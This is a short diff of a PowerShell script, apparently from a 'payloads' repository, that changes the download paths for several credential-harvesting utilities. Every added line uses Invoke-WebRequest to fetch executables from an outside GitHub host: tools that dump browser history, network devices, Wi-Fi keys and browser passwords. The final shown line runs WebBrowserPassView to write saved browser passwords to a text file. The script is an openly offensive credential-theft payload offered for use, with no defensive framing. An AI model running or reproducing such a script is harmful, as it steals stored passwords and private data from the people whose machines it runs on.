@@ -1,8 +1,8 @@
 # Download the Software
-Invoke-WebRequest https://github.com/Hacktivist2023/payloads/blob/master/tools/BrowsingHistoryView.exe?raw=true  -OutFile BrowsingHistoryView.exe
-Invoke-WebRequest https://github.com/Hacktivist2023/payloads/blob/master/tools/WNetWatcher.exe?raw=true  -OutFile WNetWatcher.exe
-Invoke-WebRequest https://github.com/Hacktivist2023/payloads/blob/master/tools/WirelessKeyView.exe?raw=true  -OutFile WirelessKeyView.exe
-Invoke-WebRequest https://github.com/Hacktivist2023/payloads/blob/master/tools/WebBrowserPassView.exe?raw=true  -OutFile WebBrowserPassView.exe 
+Invoke-WebRequest https://github.com/Hacktivist2023/payloads/blob/master/support/BrowsingHistoryView.exe?raw=true  -OutFile BrowsingHistoryView.exe
+Invoke-WebRequest https://github.com/Hacktivist2023/payloads/blob/master/support/WNetWatcher.exe?raw=true  -OutFile WNetWatcher.exe
+Invoke-WebRequest https://github.com/Hacktivist2023/payloads/blob/master/support/WirelessKeyView.exe?raw=true  -OutFile WirelessKeyView.exe
+Invoke-WebRequest https://github.com/Hacktivist2023/payloads/blob/master/support/WebBrowserPassView.exe?raw=true  -OutFile WebBrowserPassView.exe 
 
 # Create the file for Browser passwords
 .\WebBrowserPassView.exe /stext passwords.txt
